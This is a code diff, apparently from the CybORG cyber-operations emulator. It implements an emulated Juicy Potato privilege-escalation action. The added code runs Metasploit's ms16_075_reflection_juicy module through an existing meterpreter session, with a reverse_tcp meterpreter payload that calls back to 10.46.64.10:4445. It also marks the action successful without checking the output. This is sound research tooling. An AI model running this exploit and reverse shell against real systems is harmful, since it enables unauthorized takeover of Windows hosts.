@@ -62,8 +62,30 @@ class MSFJuicyPotato(MSFPrivilegeEscalation):
 
         return obs
 
-    def emu_execute(self) -> Observation:
-        raise NotImplementedError
+    def emu_execute(self, session_handler) -> Observation:
+        obs = Observation()
+        from CybORG.Emulator.Session import MSFSessionHandler
+        if type(session_handler) is not MSFSessionHandler:
+            obs.set_success(False)
+            return obs
+
+        sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="meterpreter")
+        print(sessions)
+        if len(sessions) == 0:
+            obs.set_success(False)
+            return obs
+        session = list(sessions.keys())[0]
+        output = session_handler.execute_module(mtype='exploit', mname='windows/local/ms16_075_reflection_juicy', opts={'RHOSTS': str(self.ip_address), 'SESSION': session}, payload_name='windows/x64/meterpreter/reverse_tcp', payload_opts={'LHOST': "10.46.64.10", 'LPORT': 4445})
+        obs.add_raw_obs(output)
+        obs.set_success(False)
+        session_handler._log_debug(output)
+        """
+        example output
+        """
+        for line in output.split('\n'):
+          print(line)
+        obs.set_success(True)
+        return obs
 
     def test_exploit_works(self, target_host: Host) ->\
             Tuple[bool, Tuple[Process, ...]]:
